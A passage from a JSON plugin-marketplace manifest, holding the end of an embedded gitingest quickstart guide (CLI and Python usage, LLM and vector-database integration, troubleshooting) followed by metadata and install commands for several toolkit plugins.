f\"\"\"\n# Code Review for {repo_url}\n\n## Quick Stats\n- Files: {py_count}\n- Has tests: {'' if has_tests else ''}\n- Has docs: {'' if has_docs else ''}\n\n## Summary\n{summary}\n\"\"\"\n```\n\n**Usage:**\n```bash\npython quick_review.py https://github.com/user/repo\n```\n\n### 4. Filtered Analysis (3 minutes)\n\n**CLI:**\n```bash\n# Python files only\ngitingest https://github.com/user/repo -i \"*.py\" -o -\n\n# Exclude dependencies\ngitingest https://github.com/user/repo -e \"node_modules/*\" -e \"*.log\" -o -\n\n# Combine filters\ngitingest repo-url -i \"*.py\" -i \"*.js\" -e \"node_modules/*\" -e \"dist/*\" -o -\n```\n\n**Python:**\n```python\nsummary, tree, content = ingest(\n    \"https://github.com/user/repo\",\n    include_patterns=[\"*.py\", \"*.js\"],\n    exclude_patterns=[\"node_modules/*\", \"*.log\"],\n    max_file_size=51200  # Skip files > 50KB\n)\n\nprint(f\"Analyzed Python and JS files only\")\nprint(f\"Skipped large files, node_modules, and logs\")\n```\n\n### 5. Private Repository (2 minutes)\n\n**Setup:**\n```bash\n# Create token at https://github.com/settings/tokens\nexport GITHUB_TOKEN=\"ghp_your_token_here\"\n\n# Use it\ngitingest https://github.com/user/private-repo -t $GITHUB_TOKEN -o -\n```\n\n**Python:**\n```python\nimport os\nfrom gitingest import ingest\n\ntoken = os.getenv('GITHUB_TOKEN')\nif not token:\n    print(\"Set GITHUB_TOKEN environment variable\")\n    exit(1)\n\nsummary, tree, content = ingest(\n    \"https://github.com/user/private-repo\",\n    token=token\n)\n\nprint(\"Successfully accessed private repository!\")\n```\n\n### 6. Batch Processing (5 minutes)\n\n```python\nimport asyncio\nfrom gitingest import ingest_async\n\nasync def analyze_multiple():\n    repos = [\n        \"https://github.com/user/repo1\",\n        \"https://github.com/user/repo2\",\n        \"https://github.com/user/repo3\"\n    ]\n\n    # Process all at once\n    tasks = [ingest_async(url) for url in repos]\n    results = await asyncio.gather(*tasks)\n\n    # Display summary\n    for i, (summary, tree, content) in enumerate(results):\n        print(f\"\\n=== Repository {i+1} ===\")\n        print(summary.split('\\n')[0])  # First line only\n\nasyncio.run(analyze_multiple())\n```\n\n**Usage:**\n```bash\npython batch_analyze.py\n```\n\n## Common Patterns (Copy-Paste)\n\n### Pattern 1: Extract All Python Files\n```python\nfrom gitingest import ingest\n\nsummary, tree, content = ingest(\n    \"https://github.com/user/repo\",\n    include_patterns=[\"*.py\"]\n)\n\n# Split into individual files\nfiles = []\ncurrent_file = None\n\nfor line in content.split('\\n'):\n    if line.startswith('FILE: '):\n        if current_file:\n            files.append(current_file)\n        current_file = {'path': line.replace('FILE: ', ''), 'content': []}\n    elif current_file:\n        current_file['content'].append(line)\n\nif current_file:\n    files.append(current_file)\n\nprint(f\"Found {len(files)} Python files\")\nfor file in files:\n    print(f\"- {file['path']} ({len(file['content'])} lines)\")\n```\n\n### Pattern 2: Count Lines of Code\n```python\nfrom gitingest import ingest\n\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\nfiles = content.split('================================================')\nfiles = [f for f in files if 'FILE:' in f]\n\ntotal_lines = 0\nfor file in files:\n    lines = file.split('\\n')\n    total_lines += len(lines)\n\nprint(f\"Total lines of code: {total_lines}\")\nprint(f\"Files: {len(files)}\")\n```\n\n### Pattern 3: Find TODO Comments\n```python\nfrom gitingest import ingest\n\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\ntodos = []\nfor line in content.split('\\n'):\n    if 'todo' in line.lower() or 'fixme' in line.lower():\n        todos.append(line.strip())\n\nprint(f\"Found {len(todos)} TODOs/FIXMEs:\")\nfor todo in todos[:10]:  # First 10\n    print(f\"- {todo}\")\n```\n\n### Pattern 4: Extract Functions\n```python\nfrom gitingest import ingest\nimport re\n\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\nfunctions = []\nfor line in content.split('\\n'):\n    match = re.match(r'def\\s+(\\w+)\\s*\\(', line)\n    if match:\n        functions.append(match.group(1))\n\nprint(f\"Found {len(functions)} functions:\")\nfor func in functions[:20]:  # First 20\n    print(f\"- {func}\")\n```\n\n### Pattern 5: Check Test Coverage\n```python\nfrom gitingest import ingest\n\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\n# Count test files\ntest_files = []\nsource_files = []\n\nfor line in content.split('\\n'):\n    if line.startswith('FILE: '):\n        path = line.replace('FILE: ', '')\n        if 'test' in path.lower():\n            test_files.append(path)\n        elif '.' in path and not path.startswith('.'):\n            source_files.append(path)\n\ncoverage = len(test_files) / max(len(source_files), 1) * 100\n\nprint(f\"Test files: {len(test_files)}\")\nprint(f\"Source files: {len(source_files)}\")\nprint(f\"Estimated test coverage: {coverage:.1f}%\")\n```\n\n## Integration Examples\n\n### With OpenAI/Anthropic\n```python\nfrom gitingest import ingest\nimport openai  # or anthropic\n\n# Get repository\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\n# Send to LLM\nprompt = f\"\"\"\nAnalyze this repository:\n\n{summary}\n\n{tree}\n\n{content[:10000]}  # First 10k chars\n\nProvide insights about:\n1. Architecture\n2. Code quality\n3. Potential improvements\n\"\"\"\n\nresponse = openai.ChatCompletion.create(\n    model=\"gpt-4\",\n    messages=[{\"role\": \"user\", \"content\": prompt}]\n)\n\nprint(response.choices[0].message.content)\n```\n\n### With Vector Database\n```python\nfrom gitingest import ingest\nfrom sentence_transformers import SentenceTransformer\nimport numpy as np\n\n# Get repository\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\n# Split into chunks\nchunks = content.split('================================================')\nchunks = [c.strip() for c in chunks if c.strip()]\n\n# Embed\nmodel = SentenceTransformer('all-MiniLM-L6-v2')\nembeddings = model.encode(chunks)\n\n# Store in vector DB (example with FAISS)\nimport faiss\nindex = faiss.IndexFlatIP(embeddings.shape[1])\nindex.add(embeddings.astype('float32'))\n\n# Save index\nfaiss.write_index(index, 'repo_index.faiss')\n\nprint(f\"Indexed {len(chunks)} chunks\")\n```\n\n### With GitHub Actions\n```yaml\n# .github/workflows/analyze.yml\nname: Repository Analysis\n\non: [push, pull_request]\n\njobs:\n  analyze:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Setup Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: '3.10'\n\n      - name: Install gitingest\n        run: pip install gitingest\n\n      - name: Analyze repository\n        run: |\n          gitingest . -o current-repo.txt\n\n          python -c \"\n          from gitingest import ingest\n          summary, tree, content = ingest('.')\n          print('Repository analyzed successfully')\n          \"\n\n      - name: Upload analysis\n        uses: actions/upload-artifact@v3\n        with:\n          name: analysis\n          path: current-repo.txt\n```\n\n## CLI One-Liners (Copy-Paste)\n\n```bash\n# Count files\ngitingest repo-url -o - | grep -c \"FILE:\"\n\n# Extract file names\ngitingest repo-url -o - | grep \"^FILE:\" | sed 's/FILE: //'\n\n# Count lines\ngitingest repo-url -o - | wc -l\n\n# Find Python files only\ngitingest repo-url -i \"*.py\" -o - | grep \"^FILE:\"\n\n# Skip large files\ngitingest repo-url -s 10240 -o - | head -100\n\n# Extract README\ngitingest repo-url -o - | awk '/FILE: README/,/FILE:/' | tail -n +2\n\n# Count functions\ngitingest repo-url -o - | grep -c \"def \"\n\n# Find TODOs\ngitingest repo-url -o - | grep -i \"todo\\|fixme\"\n\n# Show structure only\ngitingest repo-url -o - | sed -n '/Directory structure/,/=====/p'\n```\n\n## Troubleshooting\n\n### Issue: \"Command not found\"\n**Solution:**\n```bash\n# Add to PATH or use full path\npython -m gitingest repo-url -o -\n\n# Or reinstall\npipx uninstall gitingest\npipx install gitingest\n```\n\n### Issue: \"Repository not found\"\n**Solution:**\n```bash\n# Check URL format\ngitingest https://github.com/username/repository-name\n\n# For private repos\nexport GITHUB_TOKEN=\"your_token\"\ngitingest https://github.com/private/repo -t $GITHUB_TOKEN\n```\n\n### Issue: \"Rate limit exceeded\"\n**Solution:**\n```bash\n# Authenticate\nexport GITHUB_TOKEN=\"your_token\"\n\n# Or wait and retry\nsleep 60\ngitingest repo-url\n```\n\n### Issue: \"Memory error\"\n**Solution:**\n```python\n# Use filtering\nsummary, tree, content = ingest(\n    repo_url,\n    include_patterns=[\"*.py\"],  # Limit to specific files\n    max_file_size=51200  # Skip large files\n)\n\n# Or process in chunks\nfiles = split_content(content)\nfor file in files:\n    process_file(file)  # Process one at a time\n```\n\n## Next Steps\n\n1. **Read the API Reference** - Full documentation at `references/api-reference.md`\n2. **Explore Integration Patterns** - See `references/integration-patterns.md`\n3. **Check Examples** - See `examples/` directory\n4. **Join Community** - https://discord.gg/zerRaGK9EC\n\n## Resources\n\n- **Website**: https://gitingest.com\n- **GitHub**: https://github.com/coderamp-labs/gitingest\n- **PyPI**: https://pypi.org/project/gitingest/\n- **Documentation**: This skill's references/ directory\n\n---\n\n**Happy coding!** \n"
      },
      "plugins": [
        {
          "name": "sys-core",
          "source": "./plugins/sys-core",
          "description": "INFRASTRUCTURE & SYSTEM DOMAIN - Foundation tools for system stability, security auditing, plugin management, validation, hooks, MCP integration, and development infrastructure",
          "version": "1.0.4",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "Infrastructure",
          "tags": [
            "security",
            "infrastructure",
            "validation",
            "hooks"
          ],
          "keywords": [
            "security",
            "audit",
            "validation",
            "toolkit",
            "infrastructure",
            "safety",
            "hooks",
            "scaffolding",
            "mcp"
          ],
          "strict": true,
          "categories": [
            "audit",
            "hooks",
            "infrastructure",
            "mcp",
            "safety",
            "scaffolding",
            "security",
            "toolkit",
            "validation"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-core@cattoolkit"
          ]
        },
        {
          "name": "sys-builder",
          "source": "./plugins/sys-builder",
          "description": "DEVELOPMENT & ENGINEERING DOMAIN - Software development, architecture design, planning, execution, testing, and project implementation",
          "version": "1.0.1",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "Development",
          "tags": [
            "development",
            "architecture",
            "engineering",
            "software"
          ],
          "keywords": [
            "execution",
            "architecture",
            "implementation",
            "planning",
            "tdd",
            "software-engineering",
            "builder",
            "testing"
          ],
          "strict": true,
          "categories": [
            "architecture",
            "builder",
            "development",
            "engineering",
            "execution",
            "implementation",
            "planning",
            "software",
            "software-engineering",
            "tdd",
            "testing"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-builder@cattoolkit"
          ]
        },
        {
          "name": "sys-cognition",
          "source": "./plugins/sys-cognition",
          "description": "AI/ML & COGNITIVE DOMAIN - Context engineering, memory systems, reasoning, prompt engineering, and agent orchestration",
          "version": "1.0.3",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "AI/ML",
          "tags": [
            "cognition",
            "reasoning",
            "prompt-engineering",
            "thinking"
          ],
          "keywords": [
            "thinking",
            "prompt-engineering",
            "analysis",
            "frameworks",
            "reasoning",
            "deep-analysis"
          ],
          "strict": true,
          "categories": [
            "ai/ml",
            "analysis",
            "cognition",
            "deep-analysis",
            "frameworks",
            "prompt-engineering",
            "reasoning",
            "thinking"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-cognition@cattoolkit"
          ]
        },
        {
          "name": "sys-agents",
          "source": "./plugins/sys-agents",
          "description": "Agent & LLM development patterns, orchestration, context management, and memory systems for building effective AI agents.",
          "version": "1.0.0",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "AI/ML",
          "tags": [
            "agents",
            "orchestration",
            "context-engineering",
            "memory"
          ],
          "keywords": [
            "agent-design",
            "context-engineering",
            "memory-systems",
            "orchestration",
            "multi-agent",
            "sub-agents",
            "rag",
            "hybrid-search",
            "vector-databases"
          ],
          "strict": true,
          "categories": [
            "agent-design",
            "agents",
            "ai/ml",
            "context-engineering",
            "hybrid-search",
            "memory",
            "memory-systems",
            "multi-agent",
            "orchestration",
            "rag",
            "sub-agents",
            "vector-databases"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-agents@cattoolkit"
          ]
        },
        {
          "name": "sys-research",
          "source": "./plugins/sys-research",
          "description": "RESEARCH & KNOWLEDGE DOMAIN - Research tools, knowledge retrieval, codebase analysis, gitingest, and experimental analysis",
          "version": "1.0.3",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "Research",
          "tags": [
            "research",
            "analysis",
            "knowledge",
            "documentation"
          ],
          "keywords": [
            "research",
            "knowledge-retrieval",
            "analysis",
            "experimental",
            "documentation",
            "gitingest",
            "codebase-analysis"
          ],
          "strict": true,
          "categories": [
            "analysis",
            "codebase-analysis",
            "documentation",
            "experimental",
            "gitingest",
            "knowledge",
            "knowledge-retrieval",
            "research"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-research@cattoolkit"
          ]
        },
        {
          "name": "sys-edge",
          "source": "./plugins/sys-edge",
          "description": "EDGE & TOOLING DOMAIN - Edge AI, mobile optimization, offline-first systems, Python tooling, and resource-constrained environments",
          "version": "1.0.2",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "Tools",
          "tags": [
            "edge",
            "mobile",
            "optimization",
            "python"
          ],
          "keywords": [
            "edge",
            "mobile",
            "optimization",
            "offline-sync",
            "battery",
            "quantization",
            "uv",
            "ruff",
            "python-tools"
          ],
          "strict": true,
          "categories": [
            "battery",
            "edge",
            "mobile",
            "offline-sync",
            "optimization",
            "python",
            "python-tools",
            "quantization",
            "ruff",
            "tools",
            "uv"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-edge@cattoolkit"
          ]
        },
        {
          "name": "sys-multimodal",
          "source": "./plugins/sys-multimodal",
          "description": "MEDIA & MULTIMODAL DOMAIN - Advanced tools for video editing, media processing, multimodal AI, visual content creation, and data visualization",
          "version": "1.0.1",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "Media",
          "tags": [
            "multimodal",
            "video",
            "media",
            "visualization"
          ],
          "keywords": [
            "multimodal",
            "video-editing",
            "media-processing",
            "vision",
            "audio",
            "scene-detection",
            "intent-translation",
            "data-visualization",
            "storytelling"
          ],
          "strict": true,
          "categories": [
            "audio",
            "data-visualization",
            "intent-translation",
            "media",
            "media-processing",
            "multimodal",
            "scene-detection",
            "storytelling",
            "video",
            "video-editing",
            "vision",
            "visualization"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-multimodal@cattoolkit"
          ]
        },
        {
          "name": "sys-nodejs",
          "source": "./plugins/sys-nodejs",
          "description": "NODE.JS/TS RUNTIME DOMAIN - Language-specific tooling for Node.js, TypeScript, Bun, and npm/pnpm/bun package ecosystems",
          "version": "1.0.0",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "MIT",
          "category": "Development",
          "tags": [
            "nodejs",
            "typescript",
            "javascript",
            "bun",
            "npm"
          ],
          "keywords": [
            "nodejs",
            "typescript",
            "javascript",
            "bun",
            "npm",
            "pnpm",
            "runtime",
            "package-manager"
          ],
          "strict": true,
          "categories": [
            "bun",
            "development",
            "javascript",
            "nodejs",
            "npm",
            "package-manager",
            "pnpm",
            "runtime",
            "typescript"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-nodejs@cattoolkit"
          ]
        },
        {
          "name": "sys-browser",
          "source": "./plugins/sys-browser",
          "description": "The complete web interaction suite. Features a unified 'browser-automation' skill that intelligently orchestrates between lightweight high-speed crawling (@just-every/crawl) and complex structure-based automation (Playwright MCP).",
          "version": "2.0.0",
          "author": {
            "name": "Git-Fg"
          },
          "repository": "https://github.com/Git-Fg/thecattoolkit",
          "license": "Apache-2.0",
          "category": "Testing",
          "tags": [
            "automation",
            "testing",
            "browser",
            "playwright"
          ],
          "keywords": [
            "browser-automation",
            "testing",
            "playwright",
            "qa",
            "crawling",
            "scraping"
          ],
          "strict": true,
          "categories": [
            "automation",
            "browser",
            "browser-automation",
            "crawling",
            "playwright",
            "qa",
            "scraping",
            "testing"
          ],
          "install_commands": [
            "/plugin marketplace add Git-Fg/thecattoolkit",
            "/plugin install sys-browser@cattoolkit"
          ]
        }
      ]
    }
  ]
}